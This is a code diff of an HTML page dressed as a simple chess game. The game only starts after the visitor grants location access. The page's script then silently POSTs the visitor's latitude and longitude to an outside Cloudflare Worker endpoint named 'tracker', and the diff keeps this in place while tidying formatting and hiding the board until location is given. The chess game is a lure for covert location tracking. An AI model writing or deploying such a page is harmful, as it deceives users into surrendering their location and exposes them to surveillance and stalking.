@@ -4,24 +4,19 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chess Game</title>
-
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.css"/>
 <style>
-body {
-  margin:0; font-family:system-ui,sans-serif;
-  background: linear-gradient(135deg,#1e293b,#0f172a);
-  color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh;
-}
+body { margin:0; font-family:system-ui,sans-serif; background: linear-gradient(135deg,#1e293b,#0f172a); color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh;}
 .card {background:#111827; padding:20px; border-radius:14px; box-shadow:0 10px 30px rgba(0,0,0,0.5); text-align:center;}
 button {margin-top:15px; padding:10px 20px; font-size:16px; border:none; border-radius:10px; cursor:pointer; background:#3b82f6; color:white;}
 button:hover {background:#2563eb;}
 #status {margin-top:10px; font-size:14px; opacity:0.9;}
-#board {margin-top:15px; width:400px;}
+#board {margin-top:15px; width:400px; display:none;}
 </style>
 </head>
 <body>
 
-<div class="card" id="gameCard">
+<div class="card">
   <h1>Chess Game</h1>
   <p>Allow location to start playing!</p>
   <button onclick="requestLocation()">Allow Location</button>
@@ -33,7 +28,7 @@ button:hover {background:#2563eb;}
 <script src="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.js"></script>
 
 <script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/"; // Cloudflare Worker URL
+const WORKER_URL = "https://tracker.jovdat70.workers.dev/"; // Put your Worker URL here
 
 let game;
 let board;
@@ -49,7 +44,7 @@ function requestLocation() {
       // Send location to Worker
       fetch(WORKER_URL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type":"application/json"},
         body: JSON.stringify({
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
@@ -67,6 +62,7 @@ function requestLocation() {
 }
 
 function startChessGame() {
+  document.getElementById("board").style.display = "block";
   game = new Chess();
   board = Chessboard('board', {
     draggable: true,
@@ -76,14 +72,13 @@ function startChessGame() {
 }
 
 function handleMove(source, target) {
-  let move = game.move({ from: source, to: target, promotion: 'q' });
+  let move = game.move({from: source, to: target, promotion: 'q'});
   if (move === null) return 'snapback';
   board.position(game.fen());
-
   if (game.game_over()) {
-    if (game.in_checkmate()) alert('Checkmate! Game over.');
-    else if (game.in_stalemate()) alert('Stalemate! Game over.');
-    else if (game.in_draw()) alert('Draw! Game over.');
+    if (game.in_checkmate()) alert("Checkmate! Game over.");
+    else if (game.in_stalemate()) alert("Stalemate! Game over.");
+    else if (game.in_draw()) alert("Draw! Game over.");
   }
 }
 </script>
